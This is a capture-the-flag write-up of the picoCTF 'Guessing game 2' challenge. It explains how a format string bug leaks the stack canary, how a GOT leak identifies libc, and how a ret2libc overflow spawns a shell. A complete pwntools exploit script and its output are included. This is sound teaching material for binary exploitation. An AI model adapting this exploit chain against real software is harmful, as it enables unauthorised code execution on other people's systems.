---
title: "Guessing game 2"
date: "2025-07-31"
tags: ["picoCTF", "format string", "canary", "ret2libc"]
---

In this challenge they give us a binary and its source code.

```c
pwndbg> checksec
File:     /home/ub1cu0/Desktop/picoCTF/guessing_game_2/vuln
Arch:     i386
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
pwndbg> 
```

```c
./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
3
Nope!

What number would you like to guess?
6
Nope!

What number would you like to guess?
```

If I run the binary it looks like I am inside a loop that keeps asking me to guess a number. Let's look at the code:

```c
int main(int argc, char **argv){
. . . 
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}	
	return 0;
}
```

```c
int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}
```

```c
long get_random() {
	return rand;
}
```

There is a function that compares my input against a pseudorandom number and, if they match, it sends me to `win()`. In this case `win()` does not print the flag, it holds another part of the program. Before getting into how that function works, let's try to reach it.

Instead of generating a random number with `rand()`, the code returns the address of the `rand` function, because it just writes `return rand;` with no parentheses. That does not run the function, it returns a pointer to it.

Since the binary is compiled without PIE, the address of the rand stub in the PLT (Procedure Linkage Table) is hardcoded into the binary at compile time. rand lives in libc and ASLR is enabled, but here libc is not being reached directly, only that fixed PLT address. That is why the returned address is constant between runs, even with ASLR on.

In short, no random number is generated, and the final value is always the same because it comes from a fixed address that does not change between runs. So I can bruteforce it once and save the result with a script like this:

```python
io = conn()
io.recvlines(4)
for i in range(-4097, 4097): # Como se hace la modular de 4046 este es el rango de valores posibles
    io.sendline(str(i))
    response = io.recvline()
    io.recvlines(2)
    if b"Congrats" in response:
        print(f"Correcto: {i}")
        break
```

That gives me the number. In my case it is `-3727` on remote.

```c
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-3727
Congrats! You win! Your prize is this print statement!

New winner!
Name? 
```

Now that the code sends me into `win()`, let's take a closer look at it:

```c
void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner); // Buffer Overflow
	printf("Congrats: ");
	printf(winner); // Format Strings Vuln
	printf("\n\n");
}
```

This function has quite a few bugs. There is a buffer overflow and a format string vulnerability. With that I can try to overwrite the return address and send the program flow wherever I want. But there is a problem. The initial `checksec` showed the canary protection is enabled, so if I go looking for the offset to the return address I also overwrite the canary and I get this message:

```c
*** stack smashing detected ***: <unknown> terminated
```

How can I know the canary value? Since there is a format string vulnerability I can try to leak the canary content. A canary always starts with 00 (in little-endian), because functions like `strcpy` or `gets` need to know when they are about to touch a `canary`, and they are built to stop as soon as they hit a null byte so they do not touch anything they should not.

If I fuzz the stack I can see some values that end in 00:

```c
. . .
35: b'Congrats: 0x4b0000\n'
. . .
54: b'Congrats: 0x32f9ad87\n'
. . .
171: b'Congrats: 0x85da4700\n'
```

How do I know which one is the real one? If I leak element 171, for example, and use the canary command in `pwndbg`, I can check if they match:

```c
pwndbg> canary
. . .
00:0000│-4dc 0xffffc99c ◂— 0x9bfb4e00

. . .

New winner!
Name? %171$p
Congrats: 0x9bfb4e00
```

There it is. Locally, stack element `171` is the canary. That does not mean it is the same on remote. In my case I tried them by hand hoping it would be close to the local one, and I spent a long while at it. I should have done the leak on remote from the start, but you live and learn. On remote it turned out to be element `135`.

Now that I know the canary value I can work out the offset to it by reading the code, and check the canary works:

```c
#define BUFSIZE 512
. . .
void win() {
	char winner[BUFSIZE]; 
```

The stack frame only stores that 512 byte variable, so that is the offset to the canary. For now I have this:

```python
payload = b'A' * offset_canary + p32(canary)
```

To find out how much there is between the canary and the return address I can use a cyclic pattern, and it turns out there are 12 bytes between the canary and the return address.

```python
payload = b'A' * offset_canary + p32(canary) + b'A' * 12 (DIRECCION DE RETORNO)
```

Now that I control the return address I have to decide where to send the flow. There is no function that prints the flag here, and I did not see any interesting gadgets for a ROP either. So I could try a ret2libc and call `system(/bin/bash)`. The problem is I do not have the `libc`, so I do not know its version and I do not know where functions like `system` are.

For that I can leak a libc function and look up which libc version has that offset for it.

I can leak `puts` with `puts` to get my address like this:

```c
payload = b'A' * offset_canary + p32(canary) + b'A' * 12 + p32(exe.plt['puts']) + p32(exe.symbols.win) + p32(exe.got['puts'])
```

That prints a memory address that I can drop into a site like `libc.rip` to get the libc version:

```c
puts address: 0xf7e3c560
```

<figure><img src="https://1790737885-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FslrEYJPx2X6Fc2iLHKGp%2Fuploads%2Fa82EiNLH5hHlUXuc9YKq%2Fimage.png?alt=media&#x26;token=bf488ae5-697a-4347-8c81-e049d4a26186" alt=""><figcaption></figcaption></figure>

<figure><img src="https://1790737885-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FslrEYJPx2X6Fc2iLHKGp%2Fuploads%2F30OrmzBl7MAbEf1ZQv68%2Fimage.png?alt=media&#x26;token=38866cd0-9e78-4d4c-8ac5-2a56625a8c9b" alt=""><figcaption></figcaption></figure>

It gives me libraries from version 2.27.

Now that I have the library I can download it and tell my script that this is the libc I am going to use, like this:

```python
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")
```

Now I know the offset of every function, but I do not know the base address of the libc, which is what I need to call functions like system. For that I have to leak a function and subtract the offset I already know. I already leaked puts, so I can reuse it for the calculation:

```python
libc.address = puts_addr - 0x67560
```

Where does that address come from? It is the offset of puts inside the libc I downloaded, and it shows up when I click on it on the page:

<figure><img src="https://1790737885-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FslrEYJPx2X6Fc2iLHKGp%2Fuploads%2FTvGHhpoRXuPxutggZEo8%2Fimage.png?alt=media&#x26;token=e8b3f5d1-6860-4f18-8176-1ab512582c9e" alt=""><figcaption></figcaption></figure>

So if I subtract the puts offset from the leaked puts address I get the libc base address.

I could also let pwntools pull the offset out for me, like this:

```c
libc.address = puts_addr - libc.symbols['puts']
```

Here, while pwntools does not know the libc address it gives me the offset, and once it knows it gives me the real address.

Now that I have the base of the binary and the libc running on remote I can call whatever I want, so let's put the full script together:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln")
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")

context.binary = exe
context.terminal = ['kitty']

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("jupiter.challenges.picoctf.org", 18263)

offset_canary = 512

def main():
    io = conn()
    io.recvlines(4)

    # Bruteforce original para encontrar el número correcto:
    # for i in range(-4097, 4097):
    #     io.sendline(str(i))
    #     response = io.recvline()
    #     io.recvlines(2)
    #     if b"Congrats" in response:
    #         print(f"Correcto: {i}")
    #         break

    i = -3727
    io.sendline(str(i))
    io.sendlineafter(b'Name?', b'%135$p')
    canary = int(io.recvline().decode().strip().split(": ")[1], 16)
    log.success(f'Canary: {hex(canary)}')

    io.recvlines(2)
    io.sendline(str(i))
    io.recvlines(2)

    payload = (
        b'A' * offset_canary +
        p32(canary) +
        b'A' * 12 +
        p32(exe.plt['puts']) +
        p32(exe.symbols.win) +
        p32(exe.got['puts'])
    )

    io.sendlineafter(b'Name?', payload)
    io.recvlines(2)
    puts_addr = u32(io.recvline()[:4])
    log.success(f'puts address: {hex(puts_addr)}')

    libc.address = puts_addr - libc.symbols['puts']
    binsh_addr = next(libc.search(b'/bin/sh'))

    payload2 = (
        b'B' * offset_canary +
        p32(canary) +
        b'B' * 12 +
        p32(libc.symbols['system']) +
        p32(exe.symbols.win) +
        p32(binsh_addr)
    )

    io.sendlineafter(b'Name?', payload2)
    io.interactive()

if __name__ == "__main__":
    main()

```

And that is it. I have a shell!

```python
$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$  
```

Thanks for reading!
